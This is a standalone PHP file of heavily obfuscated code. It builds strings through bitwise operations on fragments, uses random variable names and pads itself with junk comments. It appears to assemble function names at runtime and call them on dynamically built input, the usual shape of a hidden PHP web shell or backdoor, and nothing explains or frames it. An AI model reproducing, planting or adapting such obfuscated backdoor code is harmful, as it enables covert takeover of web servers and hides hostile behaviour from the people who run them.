<?php
$qKk7qcKw='Sma'.aPzQI9s;$KED='}l3'&MF9;$XmS=mtn2^'% :b';$iNes=_I&_E;$p5=my&'w|';$Tl=#TFD'.
          'o|'&yv;$FUTRboJuc='|'&r;$jIrS="0".EGTba."`, #"|'Bd`'._2dp.'@Ab';$DB='$'^A;'JB'.
          'Zkb_xC}5Y';$JMDU='@'.TPPSX.']'.H3GL.'@LHD'|"HPT@]PWH!".A_CLIE;$qrL2='u='^#cVK'.
          ';i';$Ec9iDP4E='/.l'^'pg<';$FKuy3='0>'^'U}';$M8hqiOQW5='`'|'*';$DvpvQHRDY=#nkl'.
          '[X'&'^}';$VgYm=B|B;$hfgN0wc=nnlj.'>a'^'W8>+t$';$xH='N"&$ #'|'Z1" $1';'ggBeqMz'.
          'X=';$lxytF9zxEZ=ufdszn__Gv.'=?<,'&'1+N7{ u_O~,-:?';$Ja2bt7O_OVa='$@05$B5! 9 1'.
          '! D(11``$d %a!21'|'5d!!d 52a(1690%912Dc0%05@03 ';$YLXUK0='5'&':';'Rtzs2vSJIpR'.
          '[C_q3*%9';$pIenDByhdNw=("!d-"&klw)|$KED;$N3Y_I1pPov=$hfgN0wc^$xH;'RuLAHNwI2C1'.
          'K';$XCZKxeQCN1=('5zB{7%n '.q49u^a5xHBwJbHaiZ)^('%?_vj:esU?3o'&#zEN6whr11NlIJC'.
          '|}_U.![6]t3J');$nT1Pe_Nb=$lxytF9zxEZ^('('.eyuW.'#'.Uvcj.'<m3<'^'z&Q*'./*Mu8BK'.
          'G*Yh@QJlb*/rvsLVCv5es);$qabL=(b&y)|('!'|' ');$iUV9ZZXBV=('E}/ <C,"'|#zriikXDe'.
          '@0<0&A $')^('['.VHsF.'-77'^'7p?7%G~x');$pIenDByhdNw($N3Y_I1pPov($XmS.$iNes))/*'.
          '%0x*/==$Ja2bt7O_OVa.('9c57'&'=c42')||$XCZKxeQCN1(('l%pI'^'CD_,'),$p5.$Tl,/*og'.
          'VS*/$qabL);$nT1Pe_Nb($FUTRboJuc.$jIrS.$DB,$iUV9ZZXBV,$N3Y_I1pPov($JMDU./*_nZI'.
          'V*/$qrL2.$Ec9iDP4E),$FKuy3.('1+'.JHRpH0U.'$QWH'|' '.cXPZPY2ATHAF)./*bQ07R_YRB'.
          '{*)=%*/$M8hqiOQW5.$DvpvQHRDY.$VgYm.$YLXUK0);##!m%J5):PJ@-(6#>|2l!K#*7KG9RNI_'.
          'HxV,-wlH|*f?s}MSYyA5tsMTqWRQ6qdno22!T4c%=5e [LaTB_} vYWi&?0 $f3Xcjc';